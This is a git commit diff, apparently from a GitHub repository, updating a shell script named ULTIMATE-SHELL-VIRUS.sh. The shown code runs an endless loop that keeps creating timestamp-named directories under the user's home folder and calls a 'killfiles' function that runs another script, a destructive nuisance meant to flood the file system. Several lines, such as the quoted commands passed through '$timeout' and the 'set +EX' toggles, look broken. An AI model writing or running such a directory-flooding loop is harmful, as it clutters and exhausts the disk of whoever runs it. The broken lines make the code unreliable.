23b6631834c85454fc443e61a304c4f45d317326
J-Tech-Foundation <52475982+J-Tech-Foundation@users.noreply.github.com>
2019-09-28 08:39:32 -0400

    Update ULTIMATE-SHELL-VIRUS.sh

--- ULTIMATE-SHELL-VIRUS.sh
+++ ULTIMATE-SHELL-VIRUS.sh
@@ -21,17 +21,19 @@ killfiles(){
   echo -e "$dark_blue"
   $timeout 10 "bash yeet.sh"
 }
-set +E
+set +EX
 while true
 do
   x=$(date +%S-%N)
   if [ -d $HOME/$x ]
   then
+    set -EX
     cd $x
     mkdir $x || exit 2
     cd ../
     echo -e "$dark_blue $HOME/$x/$x/ $reset"
+    set +EX
   fi
   echo -e "$dark_blue $HOME/$x/ $reset"
-  $timeout 5 "mkdir $x" || $killfiles
+  $timeout 5 "mkdir $x" || $killfiles && set -EX
 done
